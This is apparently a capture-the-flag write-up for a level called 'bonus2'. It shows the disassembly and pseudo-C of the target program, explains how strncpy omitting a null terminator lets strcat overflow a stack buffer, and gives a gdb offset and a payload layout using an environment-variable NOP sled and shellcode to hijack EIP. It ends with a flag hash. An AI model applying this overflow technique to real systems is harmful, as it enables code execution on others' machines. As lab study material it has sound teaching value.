so let's try to launch the bonus2

└─$ ./bonus2
         
is make nothing so let's deep dive into the decompilation

info function 


0x08048484  greetuser
0x08048529  main


so is have 2 function 

let's show the main :
ump of assembler code for function main:
   0x08048529 <+0>:     push   ebp
   0x0804852a <+1>:     mov    ebp,esp
   0x0804852c <+3>:     push   edi
   0x0804852d <+4>:     push   esi
   0x0804852e <+5>:     push   ebx
   0x0804852f <+6>:     and    esp,0xfffffff0
   0x08048532 <+9>:     sub    esp,0xa0
   0x08048538 <+15>:    cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    eax,0x1
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    ebx,[esp+0x50]
   0x0804854c <+35>:    mov    eax,0x0
   0x08048551 <+40>:    mov    edx,0x13
   0x08048556 <+45>:    mov    edi,ebx
   0x08048558 <+47>:    mov    ecx,edx
   0x0804855a <+49>:    rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:    add    eax,0x4
   0x08048562 <+57>:    mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:    mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:    mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:    lea    eax,[esp+0x50]
   0x08048574 <+75>:    mov    DWORD PTR [esp],eax
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:    add    eax,0x8
   0x08048582 <+89>:    mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:    mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:    mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:   lea    eax,[esp+0x50]
   0x08048594 <+107>:   add    eax,0x28
   0x08048597 <+110>:   mov    DWORD PTR [esp],eax
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:   mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:   cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:   mov    DWORD PTR [esp+0x4],0x804873d
   0x080485cc <+163>:   mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:   mov    DWORD PTR [esp],eax
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   eax,eax
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   mov    DWORD PTR ds:0x8049988,0x1
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:   mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:   mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:   mov    DWORD PTR [esp],eax
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   eax,eax
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   mov    DWORD PTR ds:0x8049988,0x2
   0x08048618 <+239>:   mov    edx,esp
   0x0804861a <+241>:   lea    ebx,[esp+0x50]
   0x0804861e <+245>:   mov    eax,0x13
   0x08048623 <+250>:   mov    edi,edx
   0x08048625 <+252>:   mov    esi,ebx
   0x08048627 <+254>:   mov    ecx,eax
   0x08048629 <+256>:   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    esp,[ebp-0xc]
   0x08048633 <+266>:   pop    ebx
   0x08048634 <+267>:   pop    esi
   0x08048635 <+268>:   pop    edi
   0x08048636 <+269>:   pop    ebp
   0x08048637 <+270>:   ret


is really hudge and the other function si so really big so 

so i use ida to make a pseudo c :
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[76]; // [esp+0h] [ebp-ACh] BYREF
  char dest[76]; // [esp+50h] [ebp-5Ch] BYREF
  char *v6; // [esp+9Ch] [ebp-10h]

  if ( argc != 3 )
    return 1;
  memset(dest, 0, sizeof(dest));
  strncpy(dest, argv[1], 40u);
  strncpy(&dest[40], argv[2], 32u);
  v6 = getenv("LANG");
  if ( v6 )
  {
    if ( !memcmp(v6, "fi", 2u) )
    {
      language = 1;
    }
    else if ( !memcmp(v6, "nl", 2u) )
    {
      language = 2;
    }
  }
  qmemcpy(v4, dest, sizeof(v4));
  return greetuser(v4[0]);
}

and the function 

let's deep dive inside the greetuser :

int __cdecl greetuser(char a1)
{
  _DWORD v2[4]; // [esp+10h] [ebp-48h] BYREF
  __int16 v3; // [esp+20h] [ebp-38h]
  char v4; // [esp+22h] [ebp-36h]

  switch ( language )
  {
    case 1:
      v2[0] = unk_8048717;
      v2[1] = *((_DWORD *)&unk_8048717 + 1);
      v2[2] = *((_DWORD *)&unk_8048717 + 2);
      v2[3] = *((_DWORD *)&unk_8048717 + 3);
      v3 = *((_WORD *)&unk_8048717 + 8);
      v4 = *((_BYTE *)&unk_8048717 + 18);
      break;
    case 2:
      strcpy((char *)v2, "Goedemiddag! ");
      break;
    case 0:
      strcpy((char *)v2, "Hello ");
      break;
  }
  strcat(v2, &a1);
  return puts(v2);
}


so the exploitation is strncpy is copy n element but if the src element is
the same size of the dest is not copy the null byte
inside the documention :
because the strncpy copy n here 20 caracter from the input is ok right ?
yes but if you look little more close ins the man you watch this 


CAVEATS
       The name of these functions is confusing.  These functions produce a null-padded character sequence, not
       a string (see string_copying(7)).  For example:

           strncpy(buf, "1", 5);       // { '1',   0,   0,   0,   0 }
           strncpy(buf, "1234", 5);    // { '1', '2', '3', '4',   0 }
           strncpy(buf, "12345", 5);   // { '1', '2', '3', '4', '5' }
           strncpy(buf, "123456", 5);  // { '1', '2', '3', '4', '5' }

the exploitation is here ;
  strncpy(dest, argv[1], 40u);
  strncpy(&dest[40], argv[2], 32u);

  look's deep dive inside :


is move the first argument insude the src 
mov     eax, [ebp+argv]
add     eax, 4
mov     eax, [eax]


after is copy 40 octet from the src and copy to the buffer 
the buffer is size 76 
mov     dword ptr [esp+8], 40 ; 
mov     [esp+4], eax
lea     eax, [esp+80]
mov     [esp], eax
call    _strncpy


after is get the second argument and copy inside the last buffer att addr 40

mov     eax, [ebp+argv]
add     eax, 8
mov     eax, [eax]
mov     dword ptr [esp+8], 32 ;
mov     [esp+4], eax
lea     eax, [esp+40]
add     eax, 40 ;
mov     [esp], eax
call    _strncpy



so if you put more than 40 octet inside the first arguement is juste not put the \0
and after is concat two the last !


now how much you need to overidh the eip addr :

so is get from the stdin 40 + 32 = 72

and concat with the lang string nl is 13 octet so is 72 + 13 = 85 OCTET !!

i use gdb to find the offset to override the eip addr :

(gdb) pattern search $eip
[+] Searching for '61676161'/'61616761' with period=4
[+] Found at offset 23 (little-endian search) likely



so the PAYLOAD is like that :


ENV LANG=nl  + "NOP" * 100 + shellcode

arg1 = A * 40
arg2 = A * (23 -4) + ADDR_SHELLCODE


how to get the address of the payload 
(gdb) x/s *environ
0xbffff840:	 "LC_PAPER=de_CH.UTF-8"
0xbffffee9:	 "LANG=en_US.UTF-8"


and get the flag !
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587